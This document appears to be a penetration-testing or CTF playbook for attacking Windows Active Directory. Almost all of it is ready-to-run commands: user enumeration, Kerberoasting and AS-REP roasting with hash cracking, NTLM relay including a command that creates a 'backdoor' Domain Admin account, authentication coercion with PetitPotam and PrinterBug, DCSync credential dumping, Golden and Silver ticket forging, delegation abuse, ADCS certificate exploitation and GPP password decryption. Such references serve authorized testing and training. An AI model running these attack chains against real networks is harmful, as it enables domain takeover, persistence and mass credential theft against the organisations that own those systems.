# Active Directory Enumeration Playbook

Deep-dive AD recon and attack reference. Use alongside `windows_pentest_playbook.md`.

---

## Enumeration Progression

```
No access        → Kerberos user enum (kerbrute)
                 → LDAP null bind
                 → RPC null session
                 → SMB null session
Any domain user  → Full enumeration (PowerView, BloodHound, ldapsearch)
                 → Kerberoast, AS-REP roast
Admin / DA       → DCSync, SAM dump, NTDS.dit
```

---

## Stage 1: Unauthenticated Enumeration

### Domain discovery (no creds):
```bash
# DNS zone transfer attempt
dig axfr DOMAIN @DC_IP
nslookup -type=any DOMAIN DC_IP

# LDAP null bind — does it work?
ldapsearch -x -H ldap://DC_IP -s base namingcontexts
# If it returns DCs: LDAP is open to null bind

# Kerberos user enumeration (no creds, stealthy)
kerbrute userenum --dc DC_IP -d DOMAIN \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --output scans/kerbrute_valid_users.txt
# AS-REP roastable users show as "no pre-auth required" in output

# RPC null session
rpcclient -U "" DC_IP -N 2>/dev/null <<EOF
enumdomusers
enumdomgroups
querydominfo
lsaquery
EOF

# SMB null / guest
smbmap -H DC_IP
smbclient -L //DC_IP -N
enum4linux-ng -A DC_IP
```

---

## Stage 2: Authenticated Enumeration

Once any domain credential (even low-priv) is obtained:

### BloodHound collection (most complete AD picture):
```bash
# Python collector from Kali (fastest — no on-box binary needed):
pip install bloodhound 2>/dev/null
bloodhound-python -u USER -p 'PASS' -d DOMAIN -dc DC_IP \
  -c All --zip -o bloodhound_output/ 2>/dev/null

# Or on the Windows box (SharpHound):
SharpHound.exe -c All --zipfilename ad_data.zip
# Transfer to Kali → import into BloodHound GUI

# BloodHound key queries:
# - "Find Shortest Paths to Domain Admins"
# - "Find Principals with DCSync Rights"
# - "Find Computers with Unconstrained Delegation"
# - "Find AS-REP Roastable Users"
# - "Users with Most Local Admin Rights"
```

### CrackMapExec authenticated sweep:
```bash
CME="crackmapexec"
DC="DC_IP"
DOMAIN="DOMAIN"
USER="user"
PASS="pass"

$CME smb $DC -u $USER -p $PASS                    # confirm auth works
$CME smb $DC -u $USER -p $PASS --users            # all domain users
$CME smb $DC -u $USER -p $PASS --groups           # all groups
$CME smb $DC -u $USER -p $PASS --shares           # accessible shares
$CME smb $DC -u $USER -p $PASS --pass-pol         # password policy
$CME smb $DC -u $USER -p $PASS --rid-brute        # RID brute for users
$CME ldap $DC -u $USER -p $PASS --trusted-for-delegation  # delegation
$CME ldap $DC -u $USER -p $PASS --get-sid         # domain SID
$CME smb SUBNET/24 -u $USER -p $PASS              # spray subnet
$CME smb SUBNET/24 -u $USER -p $PASS --local-auth # local admin check
```

### LDAP authenticated queries:
```bash
BASE="DC=domain,DC=local"
LDAP="ldap://DC_IP"

# All users
ldapsearch -x -H $LDAP -b "$BASE" -D "USER@DOMAIN" -w "PASS" \
  "(objectClass=user)" sAMAccountName userPrincipalName memberOf \
  > scans/ldap_users.txt

# Kerberoastable (SPN set):
ldapsearch -x -H $LDAP -b "$BASE" -D "USER@DOMAIN" -w "PASS" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName \
  > scans/ldap_spns.txt

# AS-REP roastable (no pre-auth):
ldapsearch -x -H $LDAP -b "$BASE" -D "USER@DOMAIN" -w "PASS" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName > scans/ldap_asrep.txt

# Admin accounts
ldapsearch -x -H $LDAP -b "$BASE" -D "USER@DOMAIN" -w "PASS" \
  "(adminCount=1)" sAMAccountName distinguishedName > scans/ldap_admins.txt

# Computers
ldapsearch -x -H $LDAP -b "$BASE" -D "USER@DOMAIN" -w "PASS" \
  "(objectClass=computer)" name operatingSystem dNSHostName > scans/ldap_computers.txt

# Unconstrained delegation
ldapsearch -x -H $LDAP -b "$BASE" -D "USER@DOMAIN" -w "PASS" \
  "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName > scans/ldap_uncons_deleg.txt

# ADCS servers
ldapsearch -x -H $LDAP -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$BASE" \
  -D "USER@DOMAIN" -w "PASS" "(objectClass=pKIEnrollmentService)" \
  cn dNSHostName certificateTemplates > scans/ldap_adcs.txt
```

### PowerView cheat sheet (run on Windows box):
```powershell
# Import: . .\PowerView.ps1

# Domain info
Get-NetDomain
Get-NetDomainController
Get-NetForest

# Users
Get-NetUser | Select-Object samaccountname, description, pwdlastset, logoncount
Get-NetUser -SPN                          # Kerberoastable
Get-NetUser -PreauthNotRequired           # AS-REP roastable
Find-UserField -SearchField Description -SearchTerm "pass"  # description = password

# Groups
Get-NetGroup "Domain Admins" -FullData
Get-NetGroupMember "Domain Admins" -Recurse

# Computers
Get-NetComputer | Select-Object name, operatingsystem, dnshostname
Get-NetComputer -Unconstrained            # unconstrained delegation
Get-NetComputer -TrustedToAuth            # constrained delegation

# Local admin access (useful for lateral movement)
Find-LocalAdminAccess -Verbose            # which machines do we have local admin on?

# ACL analysis
Get-ObjectAcl -SamAccountName USER -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "Write"}
Invoke-ACLScanner -ResolveGUIDs | ? {$_.IdentityReference -match "USER"}

# Sessions (who's logged on where)
Get-NetSession                            # sessions on all domain computers
Get-LoggedOnLocal -ComputerName COMPUTER
Find-DomainUserLocation -UserName DA_USER # where is DA currently logged on?

# Shares
Find-DomainShare -CheckShareAccess        # accessible shares across domain
Find-InterestingDomainShareFile           # interesting files in accessible shares
```

---

## Stage 3: Attack Paths

### Kerberoasting
```bash
# From Kali (any domain user):
impacket-GetUserSPNs DOMAIN/USER:PASS \
  -dc-ip DC_IP \
  -request \
  -outputfile kerberoast.hashes

# Crack:
hashcat -m 13100 kerberoast.hashes ${CTF_ROOT}/wordlists/rockyou.txt.gz \
  -O -r /usr/share/hashcat/rules/best64.rule

# Target <CRACK_NODE_ID> GPU (faster) — see README.md § GPU Cracking Nodes for SSH:
# scp kerberoast.hashes <USER>@<CRACK_NODE_HOST>:~/ctf_crack/
# hashcat -m 13100 -O ~/ctf_crack/kerberoast.hashes ~/snapped/10k.txt rockyou.txt

# From Windows (Rubeus):
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
Rubeus.exe kerberoast /user:TARGET_SVC_ACCOUNT /format:hashcat /outfile:targeted.txt
```

### AS-REP Roasting
```bash
# From Kali (no creds needed — just user list):
impacket-GetNPUsers DOMAIN/ \
  -dc-ip DC_IP \
  -no-pass \
  -usersfile scans/kerbrute_valid_users.txt \
  -format hashcat \
  -outputfile asrep.hashes

# With creds (enumerate + request automatically):
impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat

# Crack:
hashcat -m 18200 asrep.hashes ${CTF_ROOT}/wordlists/rockyou.txt.gz -O

# From Windows (Rubeus):
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### NTLM Relay Attack
```bash
# Prerequisites: find hosts with SMB signing disabled
crackmapexec smb SUBNET/24 --gen-relay-list relay_targets.txt
# Only hosts showing "signing: False" are vulnerable

# Terminal 1 — Responder (do NOT serve SMB/HTTP — we're relaying, not capturing)
responder -I tun0 -wPv -F -b
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# Terminal 2 — ntlmrelayx
# Interactive SMB shell:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# Then: nc 127.0.0.1 11000  → interactive SMB shell

# Add domain admin user:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support \
  -c "net user backdoor P@ssw0rd123 /add /domain && net group 'Domain Admins' backdoor /add /domain"

# LDAP relay (if LDAP not signed) — add user to DA via LDAP:
impacket-ntlmrelayx -t ldaps://DC_IP --escalate-user CURRENT_USER

# Coerce authentication (if can't wait for organic traffic):
# PetitPotam (unauthenticated on unpatched systems):
python3 PetitPotam.py -u '' -p '' OUR_IP DC_IP
# PrinterBug (requires any domain account):
python3 printerbug.py DOMAIN/USER:PASS@TARGET_IP OUR_IP
```

### DCSync (requires DA or GenericAll/WriteDACL on domain)
```bash
# From Kali:
impacket-secretsdump DOMAIN/DA_USER:PASS@DC_IP -just-dc \
  -outputfile loot/dcsync_all_hashes

# Just krbtgt:
impacket-secretsdump DOMAIN/DA_USER:PASS@DC_IP -just-dc-user krbtgt

# Mimikatz (on DC or with DA creds in memory):
lsadump::dcsync /domain:DOMAIN /all /csv
lsadump::dcsync /domain:DOMAIN /user:Administrator
```

### Golden Ticket (after getting krbtgt NTLM hash from DCSync)
```bash
# Get domain SID:
impacket-getPac -targetUser Administrator DOMAIN/USER:PASS  # or from secretsdump output

# Create ticket:
impacket-ticketer \
  -nthash KRBTGT_NTLM_HASH \
  -domain-sid S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX \
  -domain DOMAIN \
  Administrator

# Use ticket:
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DOMAIN/Administrator@DC_FQDN
impacket-secretsdump -k -no-pass DC_FQDN
```

### Silver Ticket (forge TGS for specific service without krbtgt):
```bash
# Need: service account NTLM hash + domain SID + target SPN
impacket-ticketer \
  -nthash SERVICE_ACCOUNT_NTLM \
  -domain-sid S-1-5-21-... \
  -domain DOMAIN \
  -spn cifs/TARGET_SERVER \
  Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass //TARGET_SERVER/C$
```

### Unconstrained Delegation Abuse
```bash
# Find computers with unconstrained delegation (not DCs):
crackmapexec ldap DC_IP -u USER -p PASS --trusted-for-delegation

# Get on the machine → monitor for incoming TGTs:
Rubeus.exe monitor /interval:5 /nowrap

# Coerce DC to authenticate to our machine:
# PrinterBug: python printerbug.py DOMAIN/USER:PASS@DC_IP DELEGATED_MACHINE_IP

# Capture TGT, import, DCSync:
Rubeus.exe ptt /ticket:BASE64_TGT
impacket-secretsdump DOMAIN/MACHINE$@DC_IP -k -no-pass
```

### Constrained Delegation Abuse
```bash
# Find: crackmapexec ldap DC_IP -u USER -p PASS --trusted-for-delegation
# Or: Get-NetComputer -TrustedToAuth (PowerView)

# S4U2Self + S4U2Proxy (Rubeus):
Rubeus.exe s4u /user:SVC_ACCOUNT /rc4:NTLM_HASH \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET_SERVER \
  /ptt

# From Kali:
impacket-getST -spn cifs/TARGET_SERVER -impersonate Administrator \
  DOMAIN/SVC_ACCOUNT -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=Administrator@cifs_TARGET_SERVER@DOMAIN.ccache
impacket-psexec -k -no-pass Administrator@TARGET_SERVER
```

### ADCS Exploitation (certipy)
```bash
# Install: pip install certipy-ad

# Enumerate certificate templates:
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout

# ESC1 (any user can enroll, SAN not restricted → forge UPN):
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA_NAME -template VULNERABLE_TEMPLATE \
  -upn Administrator@DOMAIN -out admin_cert

# Authenticate with certificate:
certipy auth -pfx admin_cert.pfx -dc-ip DC_IP
# Returns NTLM hash → use for PtH or PTT

# ESC8 (HTTP NTLM relay to ADCS enrollment endpoint):
certipy relay -target http://CA_SERVER/certsrv/certfnsh.asp -template DomainController
# Then coerce DC auth → get DC cert → DCSync
```

---

## GPP / SYSVOL Credential Hunt

```bash
# Search for cpassword in SYSVOL:
crackmapexec smb DC_IP -u USER -p PASS -M gpp_password
# Manual:
smbclient //DC_IP/SYSVOL -U "DOMAIN/USER%PASS" -c \
  "recurse ON; ls *.xml"
# Download and grep:
smbclient //DC_IP/SYSVOL -U "DOMAIN/USER%PASS" \
  -c "recurse ON; mget *.xml" --directory ./loot/sysvol/
grep -r "cpassword" loot/sysvol/
gpp-decrypt "VALUE_FROM_CPASSWORD"
```

---

## Trust Enumeration and Cross-Domain

```bash
# List trusts:
Get-NetDomainTrust                          # PowerView
nltest /domain_trusts /all_trusts           # native
impacket-GetADUsers -all -dc-ip DC_IP DOMAIN/USER:PASS

# If bidirectional trust exists → Kerberoast / PtH into child/parent domain
# SID history abuse (parent domain → child → DA in parent via SID history)
```

---

## Quick AD Attack Prioritization

| Priority | Attack | Noise | Requirement |
|----------|--------|-------|-------------|
| 1 | Kerberoasting | Low | Any domain user |
| 2 | AS-REP roasting | Low | User list (or any domain user) |
| 3 | NTLM relay | Medium | SMB signing disabled |
| 4 | BloodHound path analysis | Low | Any domain user |
| 5 | Unconstrained delegation | Medium | Compromise delegated host |
| 6 | ADCS ESC1/ESC8 | Low-Medium | ADCS installed + vuln template |
| 7 | DCSync | Low | DA or replication rights |
| 8 | Golden Ticket | None | krbtgt hash |
